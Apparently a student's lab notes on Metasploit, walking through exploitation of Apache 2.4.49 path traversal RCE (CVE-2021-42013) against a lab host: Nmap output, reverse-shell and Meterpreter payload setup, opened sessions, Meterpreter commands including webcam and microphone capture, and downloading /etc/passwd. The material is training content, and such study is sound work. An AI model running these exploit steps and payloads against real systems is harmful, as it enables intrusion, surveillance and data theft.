+[<em>] Nmap: PORT   STATE SERVICE VERSION
+[</em>] Nmap: 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+[<em>] Nmap: | ssh-hostkey:
+[</em>] Nmap: |   3072 ac:d6:d2:e6:6f:60:c2:ed:bc:0e:be:8f:75:e9:37:86 (RSA)
+[<em>] Nmap: |   256 35:fb:0b:12:ef:d8:f1:f5:d6:82:f9:b9:8d:15:84:00 (ECDSA)
+[</em>] Nmap: |_  256 5a:28:c2:ae:cd:f0:e6:6c:f4:e3:0c:ad:c4:ff:f7:eb (ED25519)
+[<em>] Nmap: 80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+[</em>] Nmap: | http-methods:
+[<em>] Nmap: |_  Potentially risky methods: TRACE
+[</em>] Nmap: |_http-title: PikaPika
+[<em>] Nmap: |_http-server-header: Apache/2.4.49 (Unix)
+[</em>] Nmap: No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).
+[<em>] Nmap: TCP/IP fingerprint:
+[</em>] Nmap: OS:SCAN(V=7.94%E=4%D=11/21%OT=22%CT=1%CU=34052%PV=Y%DS=4%DC=T%G=Y%TM=655CC9
+[<em>] Nmap: OS:B4%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%II=I%TS=A)OPS(O1=M
+[</em>] Nmap: OS:551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%
+[<em>] Nmap: OS:O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
+[</em>] Nmap: OS:DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
+[<em>] Nmap: OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+[</em>] Nmap: OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=4D
+[<em>] Nmap: OS:C2%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+[</em>] Nmap: Network Distance: 4 hops
+[<em>] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[</em>] Nmap: TRACEROUTE (using port 23/tcp)
+[<em>] Nmap: HOP RTT      ADDRESS
+[</em>] Nmap: 1   75.94 ms 192.168.45.1
+[<em>] Nmap: 2   75.93 ms 192.168.45.254
+[</em>] Nmap: 3   77.58 ms 192.168.251.1
+[<em>] Nmap: 4   77.64 ms 192.168.250.16
+[</em>] Nmap: OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 25.12 seconds
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; hosts</p>
+<h1>Hosts</h1>
+<p>address         mac  name  os_name  os_flavor  os_sp  purpose  info  comments</p>
+<hr>
+<p>192.168.250.16             Linux               2.6.X  server</p>
+<h1>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; services 
+Services</h1>
+<p>host          port  proto  name  state  info</p>
+<hr>
+<p>192.168.250.  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 Ubuntu Linux; p
+16                                      rotocol 2.0
+192.168.250.  80    tcp    http  open   Apache httpd 2.4.49 (Unix)
+16</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; search Apache httpd 2.4.49</p>
+<h1>Matching Modules</h1>
+<h1>Name                                          Disclosure Date  Rank       Check  Description</h1>
+<hr>
+<p>   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
+   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner</p>
+<p>Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_normalize_path</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; use 0
+[*] Using configured payload linux/x64/shell/reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; info</p>
+<pre><code>   Name: Apache 2.4.49/2.4.50 Traversal RCE
+ Module: exploit/multi/http/apache_normalize_path_rce
+</code></pre>
+<p>   Platform: Unix, Linux
+       Arch: cmd, x64, x86
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-05-10</p>
+<p>Provided by:
+  Ash Daulton
+  Dhiraj Mishra
+  mekhalleh (RAMELLA Sébastien)</p>
+<p>Module side effects:
+ ioc-in-logs
+ artifacts-on-disk</p>
+<p>Module stability:
+ crash-safe</p>
+<p>Module reliability:
+ repeatable-session</p>
+<p>Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic (Dropper)
+      1   Unix Command (In-Memory)</p>
+<p>Check supported:
+  Yes</p>
+<p>Basic options:
+  Name       Current Setting  Required  Description</p>
+<hr>
+<p>  CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41
+                                        773, CVE-2021-42013)
+  DEPTH      5                yes       Depth for Path Traversal
+  Proxies                     no        A proxy chain of format type:host:port[,type:ho
+                                        st:port][...]
+  RHOSTS     192.168.250.16   yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>
+                                        .com/docs/using-metasploit/basics/using-metaspl
+                                        oit.html
+  RPORT      80               yes       The target port (TCP)
+  SSL        true             no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /cgi-bin         yes       Base path
+  VHOST                       no        HTTP server virtual host</p>
+<p>Payload information:</p>
+<p>Description:
+  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
+  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
+  it can be used to execute arbitrary commands (Remote Command Execution).
+  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).</p>
+<p>References:
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773">https://nvd.nist.gov/vuln/detail/CVE-2021-41773</a>
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42013">https://nvd.nist.gov/vuln/detail/CVE-2021-42013</a>
+  <a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a>
+  <a href="https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse">https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse</a>
+  <a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml</a>
+  <a href="https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74">https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74</a>
+  <a href="https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis">https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis</a></p>
+<p>View the full module info with the info -d command.</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set SSL false
+[!] Changing the SSL option&#39;s value may require changing RPORT!
+SSL =&gt; false
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; info</p>
+<pre><code>   Name: Apache 2.4.49/2.4.50 Traversal RCE
+ Module: exploit/multi/http/apache_normalize_path_rce
+</code></pre>
+<p>   Platform: Unix, Linux
+       Arch: cmd, x64, x86
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-05-10</p>
+<p>Provided by:
+  Ash Daulton
+  Dhiraj Mishra
+  mekhalleh (RAMELLA Sébastien)</p>
+<p>Module side effects:
+ ioc-in-logs
+ artifacts-on-disk</p>
+<p>Module stability:
+ crash-safe</p>
+<p>Module reliability:
+ repeatable-session</p>
+<p>Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic (Dropper)
+      1   Unix Command (In-Memory)</p>
+<p>Check supported:
+  Yes</p>
+<p>Basic options:
+  Name       Current Setting  Required  Description</p>
+<hr>
+<p>  CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41
+                                        773, CVE-2021-42013)
+  DEPTH      5                yes       Depth for Path Traversal
+  Proxies                     no        A proxy chain of format type:host:port[,type:ho
+                                        st:port][...]
+  RHOSTS     192.168.250.16   yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>
+                                        .com/docs/using-metasploit/basics/using-metaspl
+                                        oit.html
+  RPORT      80               yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /cgi-bin         yes       Base path
+  VHOST                       no        HTTP server virtual host</p>
+<p>Payload information:</p>
+<p>Description:
+  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
+  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
+  it can be used to execute arbitrary commands (Remote Command Execution).
+  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).</p>
+<p>References:
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773">https://nvd.nist.gov/vuln/detail/CVE-2021-41773</a>
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42013">https://nvd.nist.gov/vuln/detail/CVE-2021-42013</a>
+  <a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a>
+  <a href="https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse">https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse</a>
+  <a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml</a>
+  <a href="https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74">https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74</a>
+  <a href="https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis">https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis</a></p>
+<p>View the full module info with the info -d command.</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads </p>
+<h1>Compatible Payloads</h1>
+<h1>Name                                              Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>   0   payload/generic/custom                                             normal  No     Custom Payload
+   1   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
+   2   payload/generic/shell_bind_aws_ssm                                 normal  No     Command Shell, Bind SSM (via AWS API)
+   3   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
+   4   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
+   5   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
+   6   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
+   7   payload/linux/x64/exec                                             normal  No     Linux Execute Command
+   8   payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
+   9   payload/linux/x64/meterpreter/reverse_sctp                         normal  No     Linux Mettle x64, Reverse SCTP Stager
+   10  payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager
+   11  payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
+   12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
+   13  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
+   14  payload/linux/x64/pingback_bind_tcp                                normal  No     Linux x64 Pingback, Bind TCP Inline
+   15  payload/linux/x64/pingback_reverse_tcp                             normal  No     Linux x64 Pingback, Reverse TCP Inline
+   16  payload/linux/x64/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager
+   17  payload/linux/x64/shell/reverse_sctp                               normal  No     Linux Command Shell, Reverse SCTP Stager
+   18  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
+   19  payload/linux/x64/shell_bind_ipv6_tcp                              normal  No     Linux x64 Command Shell, Bind TCP Inline (IPv6)
+   20  payload/linux/x64/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
+   21  payload/linux/x64/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
+   22  payload/linux/x64/shell_reverse_ipv6_tcp                           normal  No     Linux x64 Command Shell, Reverse TCP Inline (IPv6)
+   23  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
+   24  payload/linux/x86/chmod                                            normal  No     Linux Chmod
+   25  payload/linux/x86/exec                                             normal  No     Linux Execute Command
+   26  payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
+   27  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
+   28  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
+   29  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
+   30  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
+   31  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
+   32  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
+   33  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
+   34  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
+   35  payload/linux/x86/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
+   36  payload/linux/x86/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
+   37  payload/linux/x86/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
+   38  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
+   39  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
+   40  payload/linux/x86/read_file                                        normal  No     Linux Read File
+   41  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
+   42  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
+   43  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
+   44  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
+   45  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
+   46  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
+   47  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
+   48  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
+   49  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
+   50  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
+   51  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
+   52  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
+   53  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
+   54  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set payload 18
+payload =&gt; linux/x64/shell/reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options</p>
+<p>Module options (exploit/multi/http/apache_normalize_path_rce):</p>
+<p>   Name       Current Setting  Required  Description</p>
+<hr>
+<p>   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
+                                         1773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:h
+                                         ost:port][...]
+   RHOSTS     192.168.250.16   yes       The target host(s), see <a href="https://docs.metasploi">https://docs.metasploi</a>
+                                         t.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host</p>
+<p>Payload options (linux/x64/shell/reverse_tcp):</p>
+<p>   Name   Current Setting  Required  Description</p>
+<hr>
+<p>   LHOST  192.168.45.182   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port</p>
+<p>Exploit target:</p>
+<p>   Id  Name</p>
+<hr>
+<p>   0   Automatic (Dropper)</p>
+<p>View the full module info with the info, or info -d command.</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; run</p>
+<p>[<em>] Started reverse TCP handler on 192.168.45.182:4444 
+[</em>] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[<em>] Scanned 1 of 1 hosts (100% complete)
+[</em>] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - Attempt to exploit for CVE-2021-42013
+[<em>] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - Sending linux/x64/shell/reverse_tcp command payload
+[</em>] Sending stage (38 bytes) to 192.168.250.16
+[*] Command shell session 1 opened (192.168.45.182:4444 -&gt; 192.168.250.16:37752) at 2023-11-21 07:20:02 -0800
+[!] This exploit may require manual cleanup of &#39;/tmp/WcSEQB&#39; on the target</p>
+<p>id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</p>
+<pre><code>- Be sure to check all options.
+ - Target port 80, `set SSL false`
+- The send stage was only 38 bytes in size.
+ - Perfect for space constraints.
+
+##### Meterpreter Payload
+
+We used a common TCP rev shell in the last section, which provided an interactive shell on the target system, but we only had the functionality of a regular command shell.  Exploit frameworks often contain more advanced payloads providing features like file transfer, pivoting, and various other methods of interaction.
+
+Metasploit contains the [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html) payload, a multi-function payload that can be dynamically extended at run-time.  the payload resides entirely in memory on the target and its comms are encrypted by default.  Meterpreter offers capabilities that are especially useful in the post-exploitation phase and is available for various OS.
+- Windows.
+- Linux.
+- MacOS.
+- Android.
+- And more.
+
+Let&#39;s display all compatible payloads in the exploit module from the prior section and search for Meterpreter payloads.  Activate a non-staged 64-bit Meterpreter TCP reverse shell payload and display its options.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads</p>
+<h1>Compatible Payloads</h1>
+<h1>Name                                              Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>...
+   13  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
+...</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set payload 13
+payload =&gt; linux/x64/meterpreter_reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options</p>
+<p>Module options (exploit/multi/http/apache_normalize_path_rce):</p>
+<p>   Name       Current Setting  Required  Description</p>
+<hr>
+<p>   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
+                                         1773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:h
+                                         ost:port][...]
+   RHOSTS     192.168.250.16   yes       The target host(s), see <a href="https://docs.metasploi">https://docs.metasploi</a>
+                                         t.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host</p>
+<p>Payload options (linux/x64/meterpreter_reverse_tcp):</p>
+<p>   Name   Current Setting  Required  Description</p>
+<hr>
+<p>   LHOST  192.168.45.182   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port</p>
+<p>Exploit target:</p>
+<p>   Id  Name</p>
+<hr>
+<p>   0   Automatic (Dropper)</p>
+<p>View the full module info with the info, or info -d command.</p>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt;</p>
+<pre><code>
+We should not that all Meterpreter payloads are staged, however the output contains staged and non-staged payloads.  The difference is in how Meterpreter payload is transferred to the target machine.  Non-staged version includes all components required to launch a Meterpreter session while the staged version uses a seperate first stage to load these [components](https://buffered.io/posts/staged-vs-stageless-handlers/).  Loading components over the network creates some traffic and may alert defensive systems.  When our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, the non-staged Meterpreter payload comes in handy.  We will use the non-staged version for the rest of the module.
+
+Run the module with our Meterpreter payload and display available commands when obtain a prompt with `help`.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; run</p>
+<p>[<em>] Started reverse TCP handler on 192.168.45.182:4444 
+[</em>] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[<em>] Scanned 1 of 1 hosts (100% complete)
+[</em>] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - Attempt to exploit for CVE-2021-42013
+[<em>] <a href="http://192.168.250.16:80">http://192.168.250.16:80</a> - Sending linux/x64/meterpreter_reverse_tcp command payload
+[</em>] Meterpreter session 2 opened (192.168.45.182:4444 -&gt; 192.168.250.16:35258) at 2023-11-21 07:50:14 -0800
+[!] This exploit may require manual cleanup of &#39;/tmp/NbyT&#39; on the target</p>
+<p>meterpreter &gt; help</p>
+<h1>Core Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+?             Help menu
+background    Backgrounds the current session
+bg            Alias for background
+bgkill        Kills a background meterpreter script
+bglist        Lists running background scripts
+bgrun         Executes a meterpreter script as a background thread
+channel       Displays information or control active channels
+close         Closes a channel
+detach        Detach the meterpreter session (for http/https)
+disable_unic  Disables encoding of unicode strings
+ode_encoding
+enable_unico  Enables encoding of unicode strings
+de_encoding
+exit          Terminate the meterpreter session
+guid          Get the session GUID
+help          Help menu
+info          Displays information about a Post module
+irb           Open an interactive Ruby shell on the current session
+load          Load one or more meterpreter extensions
+machine_id    Get the MSF ID of the machine attached to the session
+pry           Open the Pry debugger on the current session
+quit          Terminate the meterpreter session
+read          Reads data from a channel
+resource      Run the commands stored in a file
+run           Executes a meterpreter script or Post module
+secure        (Re)Negotiate TLV packet encryption on the session
+sessions      Quickly switch to another session
+use           Deprecated alias for &quot;load&quot;
+uuid          Get the UUID for the current session
+write         Writes data to a channel
+</code></pre>
+<h1>Stdapi: File system Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+cat           Read the contents of a file to the screen
+cd            Change directory
+checksum      Retrieve the checksum of a file
+chmod         Change the permissions of a file
+cp            Copy source to destination
+del           Delete the specified file
+dir           List files (alias for ls)
+download      Download a file or directory
+edit          Edit a file
+getlwd        Print local working directory
+getwd         Print working directory
+lcat          Read the contents of a local file to the screen
+lcd           Change local working directory
+lls           List local files
+lpwd          Print local working directory
+ls            List files
+mkdir         Make directory
+mv            Move source to destination
+pwd           Print working directory
+rm            Delete the specified file
+rmdir         Remove directory
+search        Search for files
+upload        Upload a file or directory
+</code></pre>
+<h1>Stdapi: Networking Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+arp           Display the host ARP cache
+getproxy      Display the current proxy configuration
+ifconfig      Display interfaces
+ipconfig      Display interfaces
+netstat       Display the network connections
+portfwd       Forward a local port to a remote service
+resolve       Resolve a set of host names on the target
+route         View and modify the routing table
+</code></pre>
+<h1>Stdapi: System Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+execute       Execute a command
+getenv        Get one or more environment variable values
+getpid        Get the current process identifier
+getuid        Get the user that the server is running as
+kill          Terminate a process
+localtime     Displays the target system local date and time
+pgrep         Filter processes by name
+pkill         Terminate processes by name
+ps            List running processes
+shell         Drop into a system command shell
+suspend       Suspends or resumes a list of processes
+sysinfo       Gets information about the remote system, such as OS
+</code></pre>
+<h1>Stdapi: Webcam Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+webcam_chat   Start a video chat
+webcam_list   List webcams
+webcam_snap   Take a snapshot from the specified webcam
+webcam_strea  Play a video stream from the specified webcam
+m
+</code></pre>
+<h1>Stdapi: Mic Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+listen        listen to a saved audio recording via audio player
+mic_list      list all microphone interfaces
+mic_start     start capturing an audio stream from the target mic
+mic_stop      stop capturing audio
+</code></pre>
+<h1>Stdapi: Audio Output Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+play          play a waveform audio file (.wav) on the target system
+</code></pre>
+<p>meterpreter &gt;</p>
+<pre><code>- We receive a promt a few seconds after launching the module.
+- Commands are divided into categories.
+ - System Commands.
+ - Networking Commands.
+ - File System Commands.
+
+Let&#39;s get familiar with some of the Meterpreter commands, we start gathering info by entering `sysinfo` and `getuid`.
+</code></pre>
+<p>meterpreter &gt; sysinfo
+Computer     : 172.29.0.2
+OS           : Ubuntu 20.04 (Linux 5.4.0-132-generic)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter &gt; getuid
+Server username: daemon
+meterpreter &gt;</p>
+<pre><code>- Providing us with info about the target computer, OS, and the current user.
+
+As we learned, Metasploit uses sessions to manage access to different machines.  When Metasploit interacts with a system in a session, it uses a concept named channels.  We can start an interactive shell by entering `shell`, execute a command in the context of a channel, and background the channel the shell runs in.  We use `Ctrl+Z` to background a channel.
+</code></pre>
+<p>meterpreter &gt; shell
+Process 135 created.
+Channel 1 created.
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+^Z
+Background channel 1? [y/N]  y
+meterpreter &gt;</p>
+<pre><code>
+Next we start a second interactive shell, exec a command, and background the channel.
+</code></pre>
+<p>meterpreter &gt; shell
+Process 137 created.
+Channel 2 created.
+whoami
+daemon
+^Z
+Background channel 2? [y/N]  y
+meterpreter &gt;</p>
+<pre><code>
+Now we can list all active channels and interact with channel 1 again, enter `channel -l` to list, and `channel -i` with the channel ID as arg to interact.
+</code></pre>
+<p>meterpreter &gt; channel -l</p>
+<pre><code>Id  Class  Type
+--  -----  ----
+1   3      stdapi_process
+2   3      stdapi_process
+</code></pre>
+<p>meterpreter &gt; channel -i 1
+Interacting with channel 1...</p>
+<p>id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</p>
+<pre><code>- We have executed commands in the context of channel 1 again.
+- Using channels will help us to manage system access and perform post-exploitation ops.
+
+next we will use the `download` and `upload` commands from the File System Commands category to transfer files to and from the system.  Let&#39;s review the commands in this category again.
+</code></pre>
+<h1>Stdapi: File system Commands</h1>
+<pre><code>Command       Description
+-------       -----------
+cat           Read the contents of a file to the screen
+cd            Change directory
+checksum      Retrieve the checksum of a file
+chmod         Change the permissions of a file
+cp            Copy source to destination
+del           Delete the specified file
+dir           List files (alias for ls)
+download      Download a file or directory
+edit          Edit a file
+getlwd        Print local working directory
+getwd         Print working directory
+lcat          Read the contents of a local file to the screen
+lcd           Change local working directory
+lls           List local files
+lpwd          Print local working directory
+ls            List files
+mkdir         Make directory
+mv            Move source to destination
+pwd           Print working directory
+rm            Delete the specified file
+rmdir         Remove directory
+search        Search for files
+upload        Upload a file or directory
+</code></pre>
+<pre><code>- Shows various commands we can use for FS ops.
+ - Commands with `l` prefix operate on the local system.
+  - Change dir for up/down-loading files for instance.
+
+Download `/etc/passwd` from the target machine to our Kali system.  Change local dir to `/home/$USER/Downloads` first, enter the `download` command, with `/etc/passwd` as arg.
+</code></pre>
+<p>meterpreter &gt; lcd /home/operator/Downloads/
+meterpreter &gt; lpwd
+/home/operator/Downloads
+meterpreter &gt; download /etc/passwd 
+[<em>] Downloading: /etc/passwd -&gt; /home/operator/Downloads/passwd
+[</em>] Downloaded 926.00 B of 926.00 B (100.0%): /etc/passwd -&gt; /home/operator/Downloads/passwd
+[*] Completed  : /etc/passwd -&gt; /home/operator/Downloads/passwd
+meterpreter &gt; lcat /home/operator/Downloads/passwd
+root:x:0:0:root:/root:/bin/bash
+...</p>
+<pre><code>- We were able to download `/etc/passwd` to our local machine.
+
+Let&#39;s assume we want to run `unix-privesc-check`, we will upload it to `/tmp`.
+</code></pre>
